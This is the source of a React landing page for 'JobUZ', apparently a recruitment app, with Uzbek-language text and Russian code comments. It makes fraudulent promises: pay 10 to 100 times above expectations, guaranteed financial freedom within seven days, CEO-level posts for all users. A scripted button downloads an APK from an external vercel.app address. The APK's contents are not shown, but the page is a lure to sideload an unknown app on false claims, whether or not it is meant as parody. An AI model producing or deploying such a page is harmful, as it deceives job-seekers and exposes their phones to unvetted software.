import React, { useEffect } from 'react';

function Work() {
  useEffect(() => {
    // Установка даты на узбекской локали
    const now = new Date();
    const options = {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    };
    const dateElement = document.getElementById('current-date');
    if (dateElement) {
      // ✅ Узбекская локализация для даты
      dateElement.textContent = now.toLocaleDateString('uz-UZ', options);
    }

    // Обработчик кнопки
    const downloadButton = document.getElementById('download-file');
    if (downloadButton) {
      const handleClick = function(e) {
        e.preventDefault();

        // Путь к файлу на сервере
        const fileUrl = 'https://uzbekistan-info.vercel.app/docs/work/JobUZ.apk  '; 

        // Создаём виртуальную ссылку
        const link = document.createElement('a');
        link.href = fileUrl;
        // ✅ Узбекское/пафосное имя файла
        link.download = 'JobUZ_Kvant_O\'rnatuvchi.apk'; 
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link); // Удаляем ссылку
      };

      downloadButton.addEventListener('click', handleClick);

      // Очистка обработчика
      return () => {
        downloadButton.removeEventListener('click', handleClick);
      };
    }
  }, []);

  return (
    <div className="App">
      {/* Фоновое изображение */}
      <div
        className="hero"
        style={{
          position: 'fixed',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          backgroundImage: "url('/ed056982-b053-481e-9f6f-6ef735a8dbb1.jpeg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat',
          filter: 'blur(5px) brightness(0.9)',
          zIndex: -1
        }}
      ></div>

      <header
        style={{
          backgroundColor: 'rgba(255, 255, 255, 0.75)',
          padding: '20px',
          textAlign: 'center',
          borderBottom: '4px solid #007a3d',
          backdropFilter: 'blur(4px)',
          WebkitBackdropFilter: 'blur(4px)'
        }}
      >
        <h1
          className="title"
          style={{
            fontSize: '3rem',
            color: '#000000',
            margin: '10px 0',
            textShadow: '0 0 8px rgba(0, 0, 0, 0.3)',
            fontWeight: '900'
          }}
        >
          JOB<span style={{ color: '#007a3d' }}>UZ</span>: KVANTLI ISHGA QABUL QILUVCHI
        </h1>
        <h2
          style={{
            fontSize: '1.8rem',
            color: '#555',
            margin: '12px 0',
            fontWeight: '600',
            fontStyle: 'italic'
          }}
        >
          HAQIQAT O'ZGARDI. FOYDALANUVCHILARIMIZNING 90% <br/>ORZULARIDAGIDAN HAM YAXSHI ISH TOPDI.
        </h2>
        <p
          className="date"
          id="current-date"
          style={{
            fontStyle: 'italic',
            color: '#777',
            marginTop: '8px',
            fontSize: '1.1rem'
          }}
        >
          {/* Дата будет установлена в useEffect */}
        </p>
      </header>

      <main
        style={{
          padding: '40px 20px', 
          maxWidth: '1000px',
          margin: '20px auto',
          backgroundColor: 'rgba(255, 255, 255, 0.95)',
          borderRadius: '15px',
          boxShadow: '0 8px 30px rgba(0, 0, 0, 0.4)',
          position: 'relative',
          zIndex: 2,
          border: '3px solid #007a3d'
        }}
      >
        <div className="content">
          <div className="text">
            <h2 style={{ color: '#007a3d', marginBottom: '20px', fontSize: '2rem', textAlign: 'center' }}>
              BIZ NIMA KAFOLATLAYMIZ? BU ISH EMAS. BU SINGULARLIK.
            </h2>
            <ul style={{ marginBottom: '30px', paddingLeft: '30px', fontSize: '1.2rem', listStyleType: 'none' }}>
              <li style={{ marginBottom: '15px', borderLeft: '5px solid #007a3d', paddingLeft: '15px' }}>
                <span style={{ fontWeight: 'bold', color: '#ff0000' }}>🚀 LAHZALIK O'SISH:</span> Hozirgi kutilmalaringizdan 10-100 baravar yuqori bo'lgan ish haqi darajasi. Bozor qonunlaridan tashqari.
              </li>
              <li style={{ marginBottom: '15px', borderLeft: '5px solid #007a3d', paddingLeft: '15px' }}>
                <span style={{ fontWeight: 'bold', color: '#ff0000' }}>🌌 KVANT MOSLIGI:</span> Sun'iy intellekt sizni ishga tushirish paytida orzuingizdagi vakansiya bilan taqqoslaydi. Rezyume va suhbatlarsiz.
              </li>
              <li style={{ marginBottom: '15px', borderLeft: '5px solid #007a3d', paddingLeft: '15px' }}>
                <span style={{ fontWeight: 'bold', color: '#ff0000' }}>💸 MOLIYAVIY MUAQQADLIK:</span> Faollashtirilgandan keyin 7 kun ichida moliyaviy erkinlik kafolati.
              </li>
              <li style={{ marginBottom: '15px', borderLeft: '5px solid #007a3d', paddingLeft: '15px' }}>
                <span style={{ fontWeight: 'bold', color: '#ff0000' }}>👑 OLIY MAQOM:</span> Barcha vakansiyalarimiz sizning shaxsan ishtirokingizni talab qiladigan CEO, CPO, CTO lavozimlaridir.
              </li>
            </ul>

            <h3 style={{ color: '#000', marginBottom: '15px', fontSize: '1.6rem', textAlign: 'center' }}>
              ORZU QILISHGA QO'RQAN ISHINGIZNI QANDAY OLISH MUMKIN?
            </h3>
            
            <p style={{ fontSize: '1.8rem', fontWeight: '900', color: '#ff0000', textAlign: 'center', textTransform: 'uppercase' }}>
              <span style={{ backgroundColor: '#fff700', padding: '5px 10px', borderRadius: '5px' }}>
                1. YUKLAB OLING. 2. ISHGA TUSHIRING. 3. PARVOZ QILING.
              </span>
            </p>

            <div
              className="action-button"
              style={{
                marginTop: '40px',
                textAlign: 'center'
              }}
            >
              <button
                id="download-file"
                style={{
                  display: 'inline-block',
                  padding: '15px 40px',
                  backgroundColor: '#ff0000',
                  color: 'white',
                  textDecoration: 'none',
                  borderRadius: '50px',
                  fontWeight: '900',
                  fontSize: '1.5rem',
                  border: '5px solid #ffaa00',
                  cursor: 'pointer',
                  transition: 'all 0.3s',
                  boxShadow: '0 10px 20px rgba(255, 0, 0, 0.5)'
                }}
                onMouseOver={(e) => {
                  e.target.style.backgroundColor = '#cc0000';
                  e.target.style.transform = 'scale(1.1)';
                  e.target.style.boxShadow = '0 15px 30px rgba(255, 0, 0, 0.7)';
                }}
                onMouseOut={(e) => {
                  e.target.style.backgroundColor = '#ff0000';
                  e.target.style.transform = 'scale(1)';
                  e.target.style.boxShadow = '0 10px 20px rgba(255, 0, 0, 0.5)';
                }}
              >
                MOLIYAVIY SINGULARLIKNI FAOLLASHTIRISH →
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* FOOTER - Дисклеймер на узбекском */}
      <footer style={{ 
          textAlign: 'center', 
          marginTop: '30px', 
          color: 'rgba(255, 255, 255, 0.8)',
          textShadow: '0 0 3px rgba(0, 0, 0, 0.9)'
      }}>
          <p style={{ fontSize: '0.8rem', fontStyle: 'italic' }}>
            © {new Date().getFullYear()} JobUZ. Inqilob muqarrar. Kelajagingizga bo'lgan barcha huquqlar himoyalangan.
          </p>
      </footer>

      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        .App {
          animation: fadeIn 0.5s ease-out;
          min-height: 100vh;
          padding-bottom: 50px;
        }

        /* Адаптивность */
        @media (max-width: 768px) {
          .title {
            font-size: 2rem;
          }

          h2 {
            font-size: 1.3rem;
          }

          h3 {
             font-size: 1.4rem;
          }
          
          ul, p {
            padding: 0 10px;
          }

          main {
            padding: 25px 15px;
            margin: 10px auto;
          }

          button {
            width: 100%;
            padding: 15px 10px;
            font-size: 1.2rem;
          }
        }

        @media (max-width: 480px) {
          .title {
            font-size: 1.5rem;
          }

          h2 {
            font-size: 1.1rem;
          }

          ul {
            padding-left: 20px;
          }

          ul li {
            font-size: 1rem;
          }
        }
      `}</style>
    </div>
  );
}

export default Work;